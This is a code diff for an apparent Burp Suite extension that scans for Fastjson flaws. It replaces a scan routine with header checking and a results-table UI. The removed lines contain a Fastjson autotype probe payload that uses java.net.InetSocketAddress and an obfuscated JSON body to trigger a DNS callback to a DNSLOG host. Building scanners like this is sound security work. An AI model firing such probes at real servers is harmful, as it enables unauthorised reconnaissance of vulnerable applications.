@@ -1,5 +1,6 @@
 package jrcet.frame.Scanner.Fastjson;
 
+import burp.api.montoya.http.handler.HttpRequestToBeSent;
 import burp.api.montoya.http.message.HttpHeader;
 import burp.api.montoya.http.message.HttpRequestResponse;
 import burp.api.montoya.http.message.requests.HttpRequest;
@@ -7,51 +8,60 @@ import burp.api.montoya.http.message.responses.HttpResponse;
 import jrcet.frame.Setting.Setting;
 import jrcet.help.Helper;
 
+import javax.swing.*;
+import java.util.HashMap;
 import java.util.HashSet;
 import java.util.List;
 import java.util.Objects;
 
 import static burp.MyExtender.*;
+import static jrcet.frame.Scanner.Fastjson.FastjsonComponent.FastjsonComponentPanel;
 
 public class Fastjson {
     public static String DNSLOG = "";
     public static String TOKEN = "";
 
-    private static final HashSet<String> UrlSet = new HashSet<>();
+    private static HashMap<String, Integer> ColumnMap =  new HashMap<>() {
+        {
+            put("#", 0);
+            put("Tool", 1);
+            put("Method", 2);
+            put("Host", 3);
+            put("Path", 4);
+            put("Length", 5);
+            put("requestTime", 6);
+            put("responseTime", 7);
+            put("Dnslog", 8);
+            put("FastJson", 9);
+        }
+    };
 
-    private static String CurrentURL;
+    public static boolean check(HttpRequestToBeSent requestToBeSent){
 
-    public static void doScan(HttpRequestResponse httpRequestResponse){
-
-        if(!check(httpRequestResponse)) return;
-
-        String randomString = Helper.createRandomString(8);
-        String body =  ("\\ufeff{,/*aab*/,'x_' : {/*aab*/\"@type\":\"java.net.InetSocketAddress\"{\"address\":/*aab*/,/*aa\"b*/ \"val\" :\""+randomString+"."+DNSLOG+"\"}}}");
-
-        HttpRequest httpRequest = httpRequestResponse.request();
-
-        HttpRequest newHttpRequest=null;
-//        newHttpRequest.withBody(body);
-        httpRequest = httpRequest.withBody(body);
-        if(Setting.DEBUG) API.logging().output().println(httpRequest.bodyToString());
-        httpRequestResponse = API.http().sendRequest(httpRequest);
-
-        HttpResponse httpResponse = httpRequestResponse.response();
-        if(Setting.DEBUG) API.logging().output().println(httpResponse.statusCode());
-        UrlSet.add(CurrentURL);
-    }
-
-    private static boolean check(HttpRequestResponse httpRequestResponse){
-        CurrentURL = httpRequestResponse.request().withPath("/").url();
-        if(UrlSet.contains(CurrentURL)) return false;
-
-        List<HttpHeader> httpHeaders = httpRequestResponse.request().headers();
+        List<HttpHeader> httpHeaders = requestToBeSent.headers();
         for(HttpHeader httpHeader: httpHeaders){
             if(Objects.equals(httpHeader.name().toLowerCase(), "content-type") && Objects.equals(httpHeader.value().toLowerCase(), "application/json")){
                 return true;
             }
         }
         return false;
+    }
+
+    public static JCheckBox getFastjsonMenuWorkBox(){
+        return (JCheckBox) Helper.getComponent(FastjsonComponentPanel, "FastjsonMenuWorkBox");
+    }
+
+    public static JTable getFastjsonLoggerTable(){
+        return (JTable) Helper.getComponent(FastjsonComponentPanel, "FastjsonLoggerTable");
+    }
+
+    public static void setFastjsonLoggerTableValueAt(String value,Integer rowIndex, String ColumnName){
+//        API.logging().output().println(rowIndex+":"+ColumnMap.get(ColumnName));
+        getFastjsonLoggerTable().getModel().setValueAt(value, rowIndex, ColumnMap.get(ColumnName));
+    }
+
+    public static String getFastjsonRequestNumber(int row){
+        return (String) getFastjsonLoggerTable().getValueAt(row,0);
     }
 
 }
